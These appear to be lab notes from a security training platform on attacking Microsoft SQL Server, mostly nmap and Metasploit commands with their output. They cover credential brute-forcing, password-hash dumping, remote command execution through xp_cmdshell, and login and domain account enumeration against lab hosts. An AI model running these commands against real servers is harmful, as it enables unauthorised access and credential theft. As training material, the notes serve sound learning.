# MSSQL

## Get Information About Server

```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-info
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:25 IST
Nmap scan report for 10.4.23.146
Host is up (0.0078s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info:
|   10.4.23.146:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds

```

```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-ntlm-info --script-args mssql.instance-port=1443
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:26 IST
Nmap scan report for 10.4.23.146
Host is up (0.0080s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info:
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

## Brute Force Credentials

Check for empty password
```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-empty-password
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:28 IST
Nmap scan report for 10.4.23.146
Host is up (0.0075s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-empty-password:
|   [10.4.23.146:1433]
|_    sa:<empty> => Login Success

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

### nmap
```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:27 IST
Nmap scan report for 10.4.23.146
Host is up (0.0077s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute:
|   [10.4.23.146:1433]
|     Credentials found:
|       auditor:jasmine1 => Login Success
|       dbadmin:bubbles1 => Login Success
|_      admin:anamaria => Login Success

Nmap done: 1 IP address (1 host up) scanned in 9.50 seconds
```

### Metasploit

```bash
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/scanner/mssql/mssql_login

msf6 auxiliary(scanner/mssql/mssql_login) > options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   BLANK_PASSWORDS      true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
   VERBOSE              true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/mssql/mssql_login) > setg RHOSTS 10.4.27.198
RHOSTS => 10.4.27.198

msf6 auxiliary(scanner/mssql/mssql_login) > set USER_FILE /root/Desktop/wordlist/common_users.txt
USER_FILE => /root/Desktop/wordlist/common_users.txt

msf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
PASS_FILE => /root/Desktop/wordlist/100-common-passwords.txt

msf6 auxiliary(scanner/mssql/mssql_login) > set VERBOSE false
VERBOSE => false

msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.4.27.198:1433      - 10.4.27.198:1433 - MSSQL - Starting authentication scanner.
[+] 10.4.27.198:1433      - 10.4.27.198:1433 - Login Successful: WORKSTATION\sa:
[+] 10.4.27.198:1433      - 10.4.27.198:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.4.27.198:1433      - 10.4.27.198:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.4.27.198:1433      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Authenticated

### Run Query

```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="Select * From master..syslogins" -oN output.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:32 IST
Nmap scan report for 10.4.23.146
Host is up (0.0077s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-query:
|   [10.4.23.146:1433]
|     Query: Select * From master..syslogins
|       sid	status	createdate	updatedate	accdate	totcpu	totio	spacelimit	timelimit	resultlimit	name	dbname	password	language	denylogin	hasaccess	isntname	isntgroup	isntuser	sysadmin	securityadmin	serveradmin	setupadmin	processadmin	diskadmin	dbcreator	bulkadmin	loginname
|       ===	======	==========	==========	=======	======	=====	==========	=========	===========	====	======	========	========	=========	=========	========	=========	========	========	=============	===========	==========	============	=========	=========	=========	=========
|       0x01	9	2003-04-08T03:40:35	2021-01-21T04:50:57	2003-04-08T03:40:35	0	0	0	0	0	sa	master	Null	us_english	0	1	00	0	1	0	0	0	0	0	0	0	sa
|       0x0106000000000009010000001e501960278b270fd34191426bf0193fc0b4e786	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0##MS_SQLResourceSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLResourceSigningCertificate##
|       0x010600000000000901000000ed1b6318a0592d96ce6d143a9184be0f758287be	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0##MS_SQLReplicationSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##
|       0x010600000000000901000000fb236d83a8dc8e7de549c56382c1a25f85ea3704	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0##MS_SQLAuthenticatorCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##
|       0x010600000000000901000000bb1b6130e13e5b67b7bd49ce40730a5b67188088	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0##MS_PolicySigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicySigningCertificate##
|       0x010600000000000901000000dcfdce5b748d5515e793fc84e1eccbe22a187f7a	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0##MS_SmoExtendedSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##
...

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

### Dump Hashes

```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:34 IST
Nmap scan report for 10.4.23.146
Host is up (0.0077s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes:
| [10.4.23.146:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

### Run Shell Commands

#### nmap

```bash
root@attackdefense:~# nmap -sS -p 1433 10.4.23.146 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=ipconfig
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-18 16:39 IST
Nmap scan report for 10.4.23.146
Host is up (0.0075s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell:
|   [10.4.23.146:1433]
|     Command: ipconfig
|       output
|       ======
|       Null
|       Windows IP Configuration
|       Null
|       Null
|       Ethernet adapter Ethernet 3:
|       Null
|          Connection-specific DNS Suffix  . : ec2.internal
|          Link-local IPv6 Address . . . . . : fe80::39c9:960f:e191:9002%8
|          IPv4 Address. . . . . . . . . . . : 10.4.23.146
|          Subnet Mask . . . . . . . . . . . : 255.255.240.0
|          Default Gateway . . . . . . . . . : 10.4.16.1
|       Null
|       Tunnel adapter Local Area Connection* 3:
|       Null
|          Media State . . . . . . . . . . . : Media disconnected
|          Connection-specific DNS Suffix  . :
|       Null
|       Tunnel adapter isatap.ec2.internal:
|       Null
|          Media State . . . . . . . . . . . : Media disconnected
|          Connection-specific DNS Suffix  . : ec2.internal
|_      Null

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

#### Metasploit

```bash
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > use auxiliary/admin/mssql/mssql_exec

msf6 auxiliary(admin/mssql/mssql_exec) > options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOSTS               10.4.27.198                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_exec) > set CMD whoami
CMD => whoami

msf6 auxiliary(admin/mssql/mssql_exec) > exploit
[*] Running module against 10.4.27.198

[*] 10.4.27.198:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'

 output
 ------
 nt service\mssql$sqlexpress

[*] Auxiliary module execution completed
```

## Server Enumeration

```bash
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS               10.4.27.198      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum) > exploit
[*] Running module against 10.4.27.198

[*] 10.4.27.198:1433 - Running MS SQL Server Enumeration...
[*] 10.4.27.198:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
[*]		Sep 24 2019 13:48:23
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.4.27.198:1433 - Configuration Parameters:
[*] 10.4.27.198:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.4.27.198:1433 - 	xp_cmdshell is Enabled
[*] 10.4.27.198:1433 - 	remote access is Enabled
[*] 10.4.27.198:1433 - 	allow updates is Not Enabled
[*] 10.4.27.198:1433 - 	Database Mail XPs is Not Enabled
[*] 10.4.27.198:1433 - 	Ole Automation Procedures are Not Enabled
[*] 10.4.27.198:1433 - Databases on the server:
[*] 10.4.27.198:1433 - 	Database name:master
[*] 10.4.27.198:1433 - 	Database Files for master:
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.4.27.198:1433 - 	Database name:tempdb
[*] 10.4.27.198:1433 - 	Database Files for tempdb:
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.4.27.198:1433 - 	Database name:model
[*] 10.4.27.198:1433 - 	Database Files for model:
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\model.mdf
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\modellog.ldf
[*] 10.4.27.198:1433 - 	Database name:msdb
[*] 10.4.27.198:1433 - 	Database Files for msdb:
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.4.27.198:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.4.27.198:1433 - System Logins on this Server:
[*] 10.4.27.198:1433 - 	sa
[*] 10.4.27.198:1433 - 	##MS_SQLResourceSigningCertificate##
[*] 10.4.27.198:1433 - 	##MS_SQLReplicationSigningCertificate##
[*] 10.4.27.198:1433 - 	##MS_SQLAuthenticatorCertificate##
[*] 10.4.27.198:1433 - 	##MS_PolicySigningCertificate##
[*] 10.4.27.198:1433 - 	##MS_SmoExtendedSigningCertificate##
[*] 10.4.27.198:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.4.27.198:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.4.27.198:1433 - 	##MS_AgentSigningCertificate##
[*] 10.4.27.198:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.4.27.198:1433 - 	NT SERVICE\SQLWriter
[*] 10.4.27.198:1433 - 	NT SERVICE\Winmgmt
[*] 10.4.27.198:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.4.27.198:1433 - 	BUILTIN\Users
[*] 10.4.27.198:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.4.27.198:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.4.27.198:1433 - 	dbadmin
[*] 10.4.27.198:1433 - 	auditor
[*] 10.4.27.198:1433 - 	admin
[*] 10.4.27.198:1433 - Disabled Accounts:
[*] 10.4.27.198:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.4.27.198:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.4.27.198:1433 - No Accounts Policy is set for:
[*] 10.4.27.198:1433 - 	sa
[*] 10.4.27.198:1433 - 	dbadmin
[*] 10.4.27.198:1433 - 	auditor
[*] 10.4.27.198:1433 - 	admin
[*] 10.4.27.198:1433 - Password Expiration is not checked for:
[*] 10.4.27.198:1433 - 	sa
[*] 10.4.27.198:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.4.27.198:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.4.27.198:1433 - 	dbadmin
[*] 10.4.27.198:1433 - 	auditor
[*] 10.4.27.198:1433 - 	admin
[*] 10.4.27.198:1433 - System Admin Logins on this Server:
[*] 10.4.27.198:1433 - 	sa
[*] 10.4.27.198:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.4.27.198:1433 - 	NT SERVICE\SQLWriter
[*] 10.4.27.198:1433 - 	NT SERVICE\Winmgmt
[*] 10.4.27.198:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.4.27.198:1433 - Windows Logins on this Server:
[*] 10.4.27.198:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.4.27.198:1433 - 	NT SERVICE\SQLWriter
[*] 10.4.27.198:1433 - 	NT SERVICE\Winmgmt
[*] 10.4.27.198:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.4.27.198:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.4.27.198:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.4.27.198:1433 - Windows Groups that can logins on this Server:
[*] 10.4.27.198:1433 - 	BUILTIN\Users
[*] 10.4.27.198:1433 - Accounts with Username and Password being the same:
[*] 10.4.27.198:1433 - 	No Account with its password being the same as its username was found.
[*] 10.4.27.198:1433 - Accounts with empty password:
[*] 10.4.27.198:1433 - 	sa
[*] 10.4.27.198:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.4.27.198:1433 - 	sp_replsetsyncstatus
[*] 10.4.27.198:1433 - 	sp_replcounters
[*] 10.4.27.198:1433 - 	sp_replsendtoqueue
[*] 10.4.27.198:1433 - 	sp_resyncexecutesql
[*] 10.4.27.198:1433 - 	sp_prepexecrpc
[*] 10.4.27.198:1433 - 	sp_repltrans
[*] 10.4.27.198:1433 - 	sp_xml_preparedocument
[*] 10.4.27.198:1433 - 	xp_qv
[*] 10.4.27.198:1433 - 	xp_getnetname
[*] 10.4.27.198:1433 - 	sp_releaseschemalock
[*] 10.4.27.198:1433 - 	sp_refreshview
[*] 10.4.27.198:1433 - 	sp_replcmds
[*] 10.4.27.198:1433 - 	sp_unprepare
[*] 10.4.27.198:1433 - 	sp_resyncprepare
[*] 10.4.27.198:1433 - 	sp_createorphan
[*] 10.4.27.198:1433 - 	xp_dirtree
[*] 10.4.27.198:1433 - 	sp_replwritetovarbin
[*] 10.4.27.198:1433 - 	sp_replsetoriginator
[*] 10.4.27.198:1433 - 	sp_xml_removedocument
[*] 10.4.27.198:1433 - 	sp_repldone
[*] 10.4.27.198:1433 - 	sp_reset_connection
[*] 10.4.27.198:1433 - 	xp_fileexist
[*] 10.4.27.198:1433 - 	xp_fixeddrives
[*] 10.4.27.198:1433 - 	sp_getschemalock
[*] 10.4.27.198:1433 - 	sp_prepexec
[*] 10.4.27.198:1433 - 	xp_revokelogin
[*] 10.4.27.198:1433 - 	sp_execute_external_script
[*] 10.4.27.198:1433 - 	sp_resyncuniquetable
[*] 10.4.27.198:1433 - 	sp_replflush
[*] 10.4.27.198:1433 - 	sp_resyncexecute
[*] 10.4.27.198:1433 - 	xp_grantlogin
[*] 10.4.27.198:1433 - 	sp_droporphans
[*] 10.4.27.198:1433 - 	xp_regread
[*] 10.4.27.198:1433 - 	sp_getbindtoken
[*] 10.4.27.198:1433 - 	sp_replincrementlsn
[*] 10.4.27.198:1433 - Instances found on this server:
[*] 10.4.27.198:1433 - 	SQLEXPRESS
[*] 10.4.27.198:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.4.27.198:1433 - 	xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > use auxiliary/admin/mssql/mssql_enum_sql_logins
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > exploit
[*] Running module against 10.4.27.198

[*] 10.4.27.198:1433 - Attempting to connect to the database server at 10.4.27.198:1433 as sa...
[+] 10.4.27.198:1433 - Connected.
[*] 10.4.27.198:1433 - Checking if sa has the sysadmin role...
[+] 10.4.27.198:1433 - sa is a sysadmin.
[*] 10.4.27.198:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.4.27.198:1433 - Enumerating logins...
[+] 10.4.27.198:1433 - 38 initial SQL Server logins were found.
[*] 10.4.27.198:1433 - Verifying the SQL Server logins...
[+] 10.4.27.198:1433 - 16 SQL Server logins were verified:
[*] 10.4.27.198:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.4.27.198:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.4.27.198:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.4.27.198:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.4.27.198:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.4.27.198:1433 -  - BUILTIN\Users
[*] 10.4.27.198:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.4.27.198:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.4.27.198:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.4.27.198:1433 -  - NT SERVICE\SQLWriter
[*] 10.4.27.198:1433 -  - NT SERVICE\Winmgmt
[*] 10.4.27.198:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 10.4.27.198:1433 -  - admin
[*] 10.4.27.198:1433 -  - auditor
[*] 10.4.27.198:1433 -  - dbadmin
[*] 10.4.27.198:1433 -  - sa
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(admin/mssql/mssql_exec) > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > options

Module options (auxiliary/admin/mssql/mssql_enum_domain_accounts):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              10000            yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS               10.4.27.198      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > exploit
[*] Running module against 10.4.27.198

[*] 10.4.27.198:1433 - Attempting to connect to the database server at 10.4.27.198:1433 as sa...
[+] 10.4.27.198:1433 - Connected.
[*] 10.4.27.198:1433 - SQL Server Name: EC2AMAZ-5861GL6
[*] 10.4.27.198:1433 - Domain Name: CONTOSO
[+] 10.4.27.198:1433 - Found the domain sid: 010500000000000515000000cf4b5eb619bca0ed968e21ef
[*] 10.4.27.198:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.4.27.198:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.4.27.198:1433 -  - CONTOSO\Guest
[*] 10.4.27.198:1433 -  - CONTOSO\krbtgt
[*] 10.4.27.198:1433 -  - CONTOSO\DefaultAccount
[*] 10.4.27.198:1433 -  - CONTOSO\Domain Admins
[*] 10.4.27.198:1433 -  - CONTOSO\Domain Users
[*] 10.4.27.198:1433 -  - CONTOSO\Domain Guests
[*] 10.4.27.198:1433 -  - CONTOSO\Domain Computers
[*] 10.4.27.198:1433 -  - CONTOSO\Domain Controllers
[*] 10.4.27.198:1433 -  - CONTOSO\Cert Publishers
[*] 10.4.27.198:1433 -  - CONTOSO\Schema Admins
[*] 10.4.27.198:1433 -  - CONTOSO\Enterprise Admins
[*] 10.4.27.198:1433 -  - CONTOSO\Group Policy Creator Owners
[*] 10.4.27.198:1433 -  - CONTOSO\Read-only Domain Controllers
[*] 10.4.27.198:1433 -  - CONTOSO\Cloneable Domain Controllers
[*] 10.4.27.198:1433 -  - CONTOSO\Protected Users
[*] 10.4.27.198:1433 -  - CONTOSO\Key Admins
[*] 10.4.27.198:1433 -  - CONTOSO\Enterprise Key Admins
[*] 10.4.27.198:1433 -  - CONTOSO\RAS and IAS Servers
[*] 10.4.27.198:1433 -  - CONTOSO\Allowed RODC Password Replication Group
[*] 10.4.27.198:1433 -  - CONTOSO\Denied RODC Password Replication Group
[*] 10.4.27.198:1433 -  - CONTOSO\SQLServer2005SQLBrowserUser$EC2AMAZ-5861GL6
[*] 10.4.27.198:1433 -  - CONTOSO\MSSQL-SERVER$
[*] 10.4.27.198:1433 -  - CONTOSO\DnsAdmins
[*] 10.4.27.198:1433 -  - CONTOSO\DnsUpdateProxy
[*] 10.4.27.198:1433 -  - CONTOSO\alice
[*] 10.4.27.198:1433 -  - CONTOSO\bob
[*] 10.4.27.198:1433 -  - CONTOSO\sysadmin
[+] 10.4.27.198:1433 - 29 user accounts, groups, and computer accounts were found.
[*] 10.4.27.198:1433 - Query results have been saved to: /root/.msf4/loot/20240118170147_default_10.4.27.198_mssql.domain.acc_100612.txt
[*] Auxiliary module execution completed
```
